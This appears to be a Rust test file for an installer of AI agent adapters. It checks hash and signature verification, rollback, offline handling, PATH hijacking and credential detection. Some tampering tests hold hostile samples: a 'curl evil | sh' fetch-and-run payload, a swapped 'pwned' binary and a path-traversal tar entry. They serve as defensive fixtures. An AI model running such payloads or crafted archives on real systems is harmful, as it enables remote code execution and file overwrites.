//! Managed adapters: install, update, probe, rollback, offline, tampering,
//! and PATH contamination. Each test builds its own signed lock; "Node" is a
//! shell script and the adapter a script that answers `initialize`.

#![cfg(unix)]

use std::collections::HashMap;
use std::io::Write;
use std::path::Path;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::Mutex as StdMutex;

use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use ring::rand::SystemRandom;
use ring::signature::{EcdsaKeyPair, KeyPair, ECDSA_P256_SHA256_ASN1_SIGNING};
use sha2::{Digest, Sha256, Sha512};

use super::install::{self, FetchError, Installer, Outcome, SetupError};
use super::lock::{Lock, Platform};
use super::verify::VerifyError;
use super::*;

const NODE_VERSION: &str = "0.0.1";

// ─── fixtures ───────────────────────────────────────────────────────────

#[derive(Default)]
struct FakeFetch {
    files: StdMutex<HashMap<String, Vec<u8>>>,
    offline: AtomicBool,
    fetched: AtomicUsize,
}

impl FakeFetch {
    fn serve(&self, url: &str, bytes: Vec<u8>) {
        self.files.lock().unwrap().insert(url.to_string(), bytes);
    }
    fn fetched(&self) -> usize {
        self.fetched.load(Ordering::SeqCst)
    }
}

#[async_trait::async_trait]
impl install::Fetch for FakeFetch {
    async fn fetch(&self, url: &str, dest: &Path) -> Result<(), FetchError> {
        if self.offline.load(Ordering::SeqCst) {
            return Err(FetchError::Offline("no route to host".into()));
        }
        let bytes = self.files.lock().unwrap().get(url).cloned();
        let bytes = bytes.ok_or_else(|| FetchError::Failed(format!("{url}: HTTP 404")))?;
        self.fetched.fetch_add(1, Ordering::SeqCst);
        std::fs::write(dest, bytes).map_err(|e| FetchError::Failed(e.to_string()))
    }
}

/// A `.tar.gz` of `(path, mode, contents)`.
fn targz(entries: &[(&str, u32, &str)]) -> Vec<u8> {
    let mut builder = tar::Builder::new(flate2::write::GzEncoder::new(
        Vec::new(),
        flate2::Compression::fast(),
    ));
    for (path, mode, body) in entries {
        let mut header = tar::Header::new_gnu();
        header.set_size(body.len() as u64);
        header.set_mode(*mode);
        header.set_entry_type(tar::EntryType::Regular);
        builder
            .append_data(&mut header, path, body.as_bytes())
            .unwrap();
    }
    builder.into_inner().unwrap().finish().unwrap()
}

fn node_archive() -> Vec<u8> {
    targz(&[
        (
            &format!("node-v{NODE_VERSION}/bin/node"),
            0o755,
            "#!/bin/sh\nexec /bin/sh \"$@\"\n",
        ),
        (&format!("node-v{NODE_VERSION}/LICENSE"), 0o644, "MIT"),
        (
            &format!("node-v{NODE_VERSION}/lib/node_modules/npm/index.js"),
            0o644,
            "npm",
        ),
    ])
}

fn adapter_script(version: &str, healthy: bool) -> String {
    if healthy {
        format!(
            "read line\necho '{{\"jsonrpc\":\"2.0\",\"id\":0,\"result\":{{\"protocolVersion\":1,\"agentInfo\":{{\"name\":\"fake\",\"version\":\"{version}\"}}}}}}'\n"
        )
    } else {
        "echo 'Error: Cannot find module zod' >&2\nexit 1\n".to_string()
    }
}

fn sri(bytes: &[u8]) -> String {
    format!("sha512-{}", STANDARD.encode(Sha512::digest(bytes)))
}

struct Signer {
    keyid: String,
    pair: EcdsaKeyPair,
    rng: SystemRandom,
}

impl Signer {
    fn new(keyid: &str) -> Signer {
        let rng = SystemRandom::new();
        let pkcs8 = EcdsaKeyPair::generate_pkcs8(&ECDSA_P256_SHA256_ASN1_SIGNING, &rng).unwrap();
        let pair = EcdsaKeyPair::from_pkcs8(&ECDSA_P256_SHA256_ASN1_SIGNING, pkcs8.as_ref(), &rng)
            .unwrap();
        Signer {
            keyid: keyid.to_string(),
            pair,
            rng,
        }
    }

    /// Base64 DER SubjectPublicKeyInfo, as the registry publishes it.
    fn spki(&self) -> String {
        let mut der = vec![
            0x30, 0x59, 0x30, 0x13, 0x06, 0x07, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x02, 0x01, 0x06,
            0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x03, 0x01, 0x07, 0x03, 0x42, 0x00,
        ];
        der.extend_from_slice(self.pair.public_key().as_ref());
        STANDARD.encode(der)
    }

    fn sign(&self, message: &str) -> String {
        STANDARD.encode(
            self.pair
                .sign(&self.rng, message.as_bytes())
                .unwrap()
                .as_ref(),
        )
    }
}

/// One adapter release served by `fetch` and described by a lock.
struct Release<'a> {
    version: &'a str,
    healthy: bool,
}

struct World {
    dir: tempfile::TempDir,
    fetch: FakeFetch,
    signer: Signer,
    platform: Platform,
}

impl World {
    fn new() -> World {
        let fetch = FakeFetch::default();
        fetch.serve("https://nodejs.test/node.tar.gz", node_archive());
        World {
            dir: tempfile::tempdir().unwrap(),
            fetch,
            signer: Signer::new("SHA256:test"),
            platform: Platform::current().expect("a supported test platform"),
        }
    }

    fn root(&self) -> &Path {
        self.dir.path()
    }

    /// Publish `release` of the `claude` adapter and return its lock.
    fn publish(&self, release: Release) -> Lock {
        let v = release.version;
        let top = targz(&[
            (
                "package/package.json",
                0o644,
                &format!("{{\"name\":\"acp\",\"version\":\"{v}\"}}"),
            ),
            (
                "package/dist/index.js",
                0o644,
                &adapter_script(v, release.healthy),
            ),
        ]);
        let dep = targz(&[("package/index.js", 0o644, "module.exports = 1")]);
        let top_url = format!("https://registry.test/acp-{v}.tgz");
        let dep_url = format!("https://registry.test/dep-{v}.tgz");
        let package = |path: &str,
                       name: &str,
                       url: &str,
                       bytes: &[u8],
                       extra: serde_json::Value| {
            let integrity = sri(bytes);
            let mut p = serde_json::json!({
                "path": path,
                "name": name,
                "version": v,
                "url": url,
                "integrity": integrity,
                "signature": {"keyid": self.signer.keyid, "sig": self.signer.sign(&format!("{name}@{v}:{integrity}"))},
            });
            p.as_object_mut()
                .unwrap()
                .extend(extra.as_object().unwrap().clone());
            p
        };
        let packages = vec![
            package(
                "node_modules/acp",
                "acp",
                &top_url,
                &top,
                serde_json::json!({}),
            ),
            package(
                "node_modules/dep",
                "dep",
                &dep_url,
                &dep,
                serde_json::json!({}),
            ),
            // Another platform's binary: never downloaded here.
            package(
                "node_modules/acp-elsewhere",
                "acp-elsewhere",
                "https://registry.test/never.tgz",
                b"never",
                serde_json::json!({"os": ["aix"]}),
            ),
        ];
        self.fetch.serve(&top_url, top);
        self.fetch.serve(&dep_url, dep);
        let node = node_archive();
        let lock = serde_json::json!({
            "schema": 1,
            "registry_keys": [{"keyid": self.signer.keyid, "key": self.signer.spki(), "expires": null}],
            "node": {
                "version": NODE_VERSION,
                "platforms": {
                    self.platform.key(): {
                        "url": "https://nodejs.test/node.tar.gz",
                        "sha256": format!("{:x}", Sha256::digest(&node)),
                        "bin": format!("node-v{NODE_VERSION}/bin/node"),
                    },
                },
            },
            "adapters": {
                "claude": {
                    "version": v,
                    "entry": "node_modules/acp/dist/index.js",
                    "packages": packages,
                },
            },
        });
        Lock::parse(&lock.to_string()).unwrap()
    }

    fn installer<'a>(&'a self, lock: &'a Lock) -> Installer<'a> {
        Installer {
            root: self.root(),
            lock,
            platform: self.platform,
            fetch: &self.fetch,
            probe_timeout: Duration::from_secs(10),
        }
    }

    fn active_version(&self) -> Option<String> {
        install::active(self.root(), "claude").map(|i| i.version)
    }

    fn dirs(&self, sub: &str) -> Vec<String> {
        let mut names: Vec<String> = std::fs::read_dir(self.root().join(sub))
            .map(|entries| {
                entries
                    .flatten()
                    .filter(|e| e.path().is_dir())
                    .map(|e| e.file_name().to_string_lossy().into_owned())
                    .collect()
            })
            .unwrap_or_default();
        names.sort();
        names
    }
}

// ─── install ────────────────────────────────────────────────────────────

#[tokio::test]
async fn a_missing_adapter_does_not_launch() {
    let w = World::new();
    assert_eq!(resolve(w.root(), ManagedAdapter::Claude, None), None);
    assert!(install::active(w.root(), "claude").is_none());
}

#[tokio::test]
async fn install_verifies_extracts_probes_and_activates() {
    let w = World::new();
    let lock = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });

    let outcome = w.installer(&lock).ensure("claude").await.unwrap();
    match outcome {
        Outcome::Installed {
            version,
            replaced,
            probe,
        } => {
            assert_eq!(version, "1.0.0");
            assert_eq!(replaced, None);
            assert_eq!(probe.agent_version.as_deref(), Some("1.0.0"));
        }
        other => panic!("expected Installed, got {other:?}"),
    }
    // Node plus the two packages for this platform; never the other one.
    assert_eq!(w.fetch.fetched(), 3);

    let launch = resolve(w.root(), ManagedAdapter::Claude, None).unwrap();
    assert_eq!(launch.source, Source::Managed);
    assert_eq!(launch.version.as_deref(), Some("1.0.0"));
    assert_eq!(
        launch.program,
        w.root().join("node").join(NODE_VERSION).join("bin/node")
    );
    assert_eq!(
        launch.args,
        [w.root()
            .join("claude/1.0.0/node_modules/acp/dist/index.js")
            .to_string_lossy()]
    );
    assert!(w
        .root()
        .join("claude/1.0.0/node_modules/dep/index.js")
        .is_file());
    assert!(!w
        .root()
        .join("claude/1.0.0/node_modules/acp-elsewhere")
        .exists());
    // Only the runtime is kept from the Node release.
    assert!(w
        .root()
        .join("node")
        .join(NODE_VERSION)
        .join("LICENSE")
        .is_file());
    assert!(!w
        .root()
        .join("node")
        .join(NODE_VERSION)
        .join("lib")
        .exists());
    // No staging left behind.
    assert_eq!(w.dirs("claude"), ["1.0.0"]);
    assert_eq!(w.dirs("node"), [NODE_VERSION]);
}

#[tokio::test]
async fn a_current_adapter_is_probed_not_reinstalled() {
    let w = World::new();
    let lock = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    w.installer(&lock).ensure("claude").await.unwrap();
    let fetched = w.fetch.fetched();

    let outcome = w.installer(&lock).ensure("claude").await.unwrap();
    assert!(matches!(outcome, Outcome::Current(_)), "{outcome:?}");
    assert_eq!(w.fetch.fetched(), fetched, "nothing downloaded");
}

// ─── update, probe, rollback ────────────────────────────────────────────

#[tokio::test]
async fn an_update_keeps_the_previous_version_to_roll_back_to() {
    let w = World::new();
    let v1 = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    w.installer(&v1).ensure("claude").await.unwrap();
    let v2 = w.publish(Release {
        version: "2.0.0",
        healthy: true,
    });

    let outcome = w.installer(&v2).ensure("claude").await.unwrap();
    assert!(
        matches!(&outcome, Outcome::Installed { version, replaced: Some(old), .. } if version == "2.0.0" && old == "1.0.0"),
        "{outcome:?}"
    );
    assert_eq!(w.active_version().as_deref(), Some("2.0.0"));
    assert_eq!(
        install::previous(w.root(), "claude").unwrap().version,
        "1.0.0"
    );
    assert_eq!(w.dirs("claude"), ["1.0.0", "2.0.0"]);

    // Only one version back is kept.
    let v3 = w.publish(Release {
        version: "3.0.0",
        healthy: true,
    });
    w.installer(&v3).ensure("claude").await.unwrap();
    assert_eq!(w.dirs("claude"), ["2.0.0", "3.0.0"]);
}

#[tokio::test]
async fn an_update_that_fails_its_probe_keeps_the_working_version() {
    let w = World::new();
    let v1 = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    w.installer(&v1).ensure("claude").await.unwrap();
    let broken = w.publish(Release {
        version: "2.0.0",
        healthy: false,
    });

    let err = w.installer(&broken).ensure("claude").await.unwrap_err();
    match &err {
        SetupError::Unhealthy(message) => {
            assert!(message.contains("Cannot find module zod"), "{message}")
        }
        other => panic!("expected Unhealthy, got {other:?}"),
    }
    assert_eq!(w.active_version().as_deref(), Some("1.0.0"));
    assert_eq!(w.dirs("claude"), ["1.0.0"], "the broken tree is removed");
    // And it still launches.
    assert_eq!(
        resolve(w.root(), ManagedAdapter::Claude, None)
            .unwrap()
            .version
            .as_deref(),
        Some("1.0.0")
    );
}

#[tokio::test]
async fn a_broken_first_install_leaves_nothing_active() {
    let w = World::new();
    let broken = w.publish(Release {
        version: "1.0.0",
        healthy: false,
    });
    assert!(matches!(
        w.installer(&broken).ensure("claude").await,
        Err(SetupError::Unhealthy(_))
    ));
    assert_eq!(w.active_version(), None);
    assert!(w.dirs("claude").is_empty());
}

#[tokio::test]
async fn rollback_returns_to_the_previous_version() {
    let w = World::new();
    let v1 = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    w.installer(&v1).ensure("claude").await.unwrap();
    let v2 = w.publish(Release {
        version: "2.0.0",
        healthy: true,
    });
    w.installer(&v2).ensure("claude").await.unwrap();

    assert_eq!(w.installer(&v2).rollback("claude").await.unwrap(), "1.0.0");
    assert_eq!(w.active_version().as_deref(), Some("1.0.0"));
    assert_eq!(
        install::previous(w.root(), "claude").unwrap().version,
        "2.0.0"
    );

    // With nothing kept, there is nothing to roll back to.
    let fresh = World::new();
    let lock = fresh.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    fresh.installer(&lock).ensure("claude").await.unwrap();
    assert!(fresh.installer(&lock).rollback("claude").await.is_err());
    assert_eq!(fresh.active_version().as_deref(), Some("1.0.0"));
}

// ─── offline ────────────────────────────────────────────────────────────

#[tokio::test]
async fn offline_a_missing_adapter_needs_network_and_retry_is_safe() {
    let w = World::new();
    let lock = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    w.fetch.offline.store(true, Ordering::SeqCst);

    let err = w.installer(&lock).ensure("claude").await.unwrap_err();
    assert!(matches!(err, SetupError::Offline(_)), "{err:?}");
    assert!(err.to_string().contains("network"), "{err}");
    assert_eq!(w.active_version(), None);
    assert!(w.dirs("claude").is_empty(), "no partial install");
    assert!(w.dirs("node").is_empty(), "no partial runtime");

    // Back online, the same call completes.
    w.fetch.offline.store(false, Ordering::SeqCst);
    w.installer(&lock).ensure("claude").await.unwrap();
    assert_eq!(w.active_version().as_deref(), Some("1.0.0"));
}

#[tokio::test]
async fn offline_an_installed_adapter_keeps_working() {
    let w = World::new();
    let v1 = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    w.installer(&v1).ensure("claude").await.unwrap();
    let v2 = w.publish(Release {
        version: "2.0.0",
        healthy: true,
    });
    w.fetch.offline.store(true, Ordering::SeqCst);

    assert!(matches!(
        w.installer(&v2).ensure("claude").await,
        Err(SetupError::Offline(_))
    ));
    assert_eq!(
        resolve(w.root(), ManagedAdapter::Claude, None)
            .unwrap()
            .version
            .as_deref(),
        Some("1.0.0")
    );
    // Current installs need no network at all.
    assert!(matches!(
        w.installer(&v1).ensure("claude").await,
        Ok(Outcome::Current(_))
    ));
}

// ─── tampering ──────────────────────────────────────────────────────────

#[tokio::test]
async fn a_package_that_does_not_match_its_hash_is_never_installed() {
    let w = World::new();
    let lock = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    // The mirror now serves different bytes for the adapter.
    w.fetch.serve(
        "https://registry.test/acp-1.0.0.tgz",
        targz(&[("package/dist/index.js", 0o644, "curl evil | sh")]),
    );

    let err = w.installer(&lock).ensure("claude").await.unwrap_err();
    assert!(
        matches!(&err, SetupError::Verify(VerifyError::Hash(what)) if what == "acp@1.0.0"),
        "{err:?}"
    );
    assert_eq!(w.active_version(), None);
    assert!(w.dirs("claude").is_empty());
}

#[tokio::test]
async fn a_package_the_registry_did_not_sign_is_never_installed() {
    let w = World::new();
    let mut lock = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    // Signed, but not by a registry key in the lock.
    let impostor = Signer::new("SHA256:test");
    let top = &mut lock.adapters.get_mut("claude").unwrap().packages[0];
    top.signature.sig = impostor.sign(&format!("{}@{}:{}", top.name, top.version, top.integrity));

    let err = w.installer(&lock).ensure("claude").await.unwrap_err();
    assert!(
        matches!(&err, SetupError::Verify(VerifyError::Signature(what)) if what == "acp@1.0.0"),
        "{err:?}"
    );
    assert_eq!(w.active_version(), None);

    // A signature over different contents fails the same way.
    let mut lock = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    let top = &mut lock.adapters.get_mut("claude").unwrap().packages[0];
    top.signature.sig = w.signer.sign("acp@1.0.0:sha512-somethingelse");
    assert!(matches!(
        w.installer(&lock).ensure("claude").await,
        Err(SetupError::Verify(VerifyError::Signature(_)))
    ));
}

#[tokio::test]
async fn a_node_runtime_that_does_not_match_its_hash_is_never_installed() {
    let w = World::new();
    let lock = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    w.fetch.serve(
        "https://nodejs.test/node.tar.gz",
        targz(&[("node/bin/node", 0o755, "#!/bin/sh\necho pwned\n")]),
    );
    assert!(matches!(
        w.installer(&lock).ensure("claude").await,
        Err(SetupError::Verify(VerifyError::Hash(_)))
    ));
    assert!(w.dirs("node").is_empty());
    assert_eq!(w.active_version(), None);
}

#[tokio::test]
async fn an_archive_path_that_escapes_the_install_is_refused() {
    let w = World::new();
    let mut lock = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    // A raw tar entry named `package/../../escaped`.
    let mut header = tar::Header::new_old();
    let name = b"package/../../escaped";
    header.as_old_mut().name[..name.len()].copy_from_slice(name);
    header.set_size(4);
    header.set_mode(0o644);
    header.set_entry_type(tar::EntryType::Regular);
    header.set_cksum();
    let mut raw = Vec::new();
    raw.extend_from_slice(header.as_bytes());
    raw.extend_from_slice(b"evil");
    raw.resize(1024 + 512, 0);
    let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
    gz.write_all(&raw).unwrap();
    let evil = gz.finish().unwrap();
    let dep = &mut lock.adapters.get_mut("claude").unwrap().packages[1];
    dep.integrity = sri(&evil);
    dep.signature.sig = w
        .signer
        .sign(&format!("{}@{}:{}", dep.name, dep.version, dep.integrity));
    w.fetch.serve("https://registry.test/dep-1.0.0.tgz", evil);

    let err = w.installer(&lock).ensure("claude").await.unwrap_err();
    assert!(err.to_string().contains("unsafe path"), "{err}");
    assert!(!w.root().join("escaped").exists());
    assert!(!w.root().join("claude/escaped").exists());
    assert_eq!(w.active_version(), None);
}

// ─── PATH ───────────────────────────────────────────────────────────────

#[tokio::test]
async fn an_adapter_on_path_is_never_used_unless_development_allows_it() {
    use std::os::unix::fs::PermissionsExt;
    let w = World::new();
    let bin = tempfile::tempdir().unwrap();
    let rogue = bin.path().join("claude-agent-acp");
    std::fs::write(&rogue, "#!/bin/sh\necho rogue\n").unwrap();
    std::fs::set_permissions(&rogue, std::fs::Permissions::from_mode(0o755)).unwrap();
    let path = bin.path().as_os_str();

    // Production: nothing installed means nothing launches, whatever PATH has.
    assert_eq!(resolve(w.root(), ManagedAdapter::Claude, None), None);
    // Development switch: PATH fills the gap, and says so.
    let dev = resolve(w.root(), ManagedAdapter::Claude, Some(path)).unwrap();
    assert_eq!((dev.program, dev.source), (rogue.clone(), Source::DevPath));

    // Once installed, the managed copy wins even in development.
    let lock = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    w.installer(&lock).ensure("claude").await.unwrap();
    let managed = resolve(w.root(), ManagedAdapter::Claude, Some(path)).unwrap();
    assert_eq!(managed.source, Source::Managed);
    assert_ne!(managed.program, rogue);
}

// ─── runtime state ──────────────────────────────────────────────────────

#[tokio::test]
async fn setup_reports_needs_network_then_healthy() {
    let w = World::new();
    // The runtime layer keys its state by adapter; Codex is used only here.
    let mut lock = w.publish(Release {
        version: "1.0.0",
        healthy: true,
    });
    let tree = lock.adapters.remove("claude").unwrap();
    lock.adapters.insert("codex".into(), tree);
    w.fetch.offline.store(true, Ordering::SeqCst);

    let err = setup_with(ManagedAdapter::Codex, w.root(), &lock, &w.fetch)
        .await
        .unwrap_err();
    assert!(matches!(err, SetupError::Offline(_)));
    let r = record(ManagedAdapter::Codex);
    assert!(
        matches!(r.setup, Setup::NeedsNetwork { .. }),
        "{:?}",
        r.setup
    );
    assert_eq!(r.health, None);

    w.fetch.offline.store(false, Ordering::SeqCst);
    setup_with(ManagedAdapter::Codex, w.root(), &lock, &w.fetch)
        .await
        .unwrap();
    let r = record(ManagedAdapter::Codex);
    assert_eq!(r.setup, Setup::Idle);
    assert_eq!(r.health, Some(("1.0.0".to_string(), true)));
}

// ─── the committed lock ─────────────────────────────────────────────────

#[test]
fn the_committed_lock_matches_the_registry_pins() {
    let lock = Lock::embedded();
    for adapter in ManagedAdapter::ALL {
        let meta = crate::acp::registry::get_agent_meta(adapter.agent());
        assert_eq!(
            adapter.locked_version(),
            meta.registry_version(),
            "{}: bump the lock and the registry pin together",
            adapter.id()
        );
        let tree = &lock.adapters[adapter.id()];
        assert!(tree.entry.starts_with("node_modules/"), "{}", tree.entry);
    }
    let apple_silicon = Platform {
        os: "darwin",
        cpu: "arm64",
    };
    assert!(lock.digest("claude", apple_silicon).is_some());
    assert!(lock.digest("codex", apple_silicon).is_some());
}

#[test]
fn every_committed_package_carries_a_valid_registry_signature() {
    let lock = Lock::embedded();
    let mut checked = 0;
    for tree in lock.adapters.values() {
        for package in &tree.packages {
            super::verify::registry_signature(&lock.registry_keys, package)
                .unwrap_or_else(|e| panic!("{e}"));
            assert!(package.integrity.starts_with("sha512-"), "{}", package.name);
            checked += 1;
        }
    }
    assert!(checked > 100, "{checked}");
}

// ─── credentials ────────────────────────────────────────────────────────

fn env_of(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
    pairs
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect()
}

fn nothing_inherited(_: &str) -> Option<String> {
    None
}

#[test]
fn codex_api_key_comes_from_the_agent_env_or_the_host() {
    let host_key = |k: &str| (k == "OPENAI_API_KEY").then(|| "sk-host".to_string());
    assert!(codex_api_key_present(
        &env_of(&[("CODEX_API_KEY", "sk-a")]),
        &nothing_inherited
    ));
    assert!(codex_api_key_present(
        &env_of(&[("OPENAI_API_KEY", "sk-a")]),
        &nothing_inherited
    ));
    assert!(codex_api_key_present(&env_of(&[]), &host_key));
    // The agent's env blanks an inherited key; whitespace is no key.
    assert!(!codex_api_key_present(
        &env_of(&[("OPENAI_API_KEY", "")]),
        &host_key
    ));
    assert!(!codex_api_key_present(
        &env_of(&[("CODEX_API_KEY", "  ")]),
        &nothing_inherited
    ));
    assert!(!codex_api_key_present(&env_of(&[]), &nothing_inherited));
}

#[test]
fn codex_counts_as_signed_in_with_a_chatgpt_login_or_an_api_key() {
    let home = tempfile::tempdir().unwrap();
    let none = env_of(&[]);
    assert!(
        !codex_signed_in(&none, &nothing_inherited, home.path()),
        "no credentials"
    );
    assert!(codex_signed_in(
        &env_of(&[("OPENAI_API_KEY", "sk-a")]),
        &nothing_inherited,
        home.path()
    ));
    std::fs::write(home.path().join("auth.json"), "{}").unwrap();
    assert!(
        codex_signed_in(&none, &nothing_inherited, home.path()),
        "ChatGPT login"
    );
}

#[test]
fn claude_counts_as_signed_in_with_a_key_credentials_file_or_keychain_item() {
    let dir = tempfile::tempdir().unwrap();
    let none = env_of(&[]);
    let no_item = || false;
    assert!(
        !claude_signed_in(&none, &nothing_inherited, dir.path(), &no_item),
        "no credentials"
    );
    assert!(claude_signed_in(
        &env_of(&[("ANTHROPIC_API_KEY", "sk-ant")]),
        &nothing_inherited,
        dir.path(),
        &no_item
    ));
    assert!(!claude_signed_in(
        &env_of(&[("ANTHROPIC_API_KEY", "")]),
        &|k: &str| (k == "ANTHROPIC_API_KEY").then(|| "sk-host".into()),
        dir.path(),
        &no_item
    ));
    assert!(
        claude_signed_in(&none, &nothing_inherited, dir.path(), &|| true),
        "keychain"
    );
    std::fs::write(dir.path().join(".credentials.json"), "{}").unwrap();
    assert!(
        claude_signed_in(&none, &nothing_inherited, dir.path(), &no_item),
        "file"
    );
}
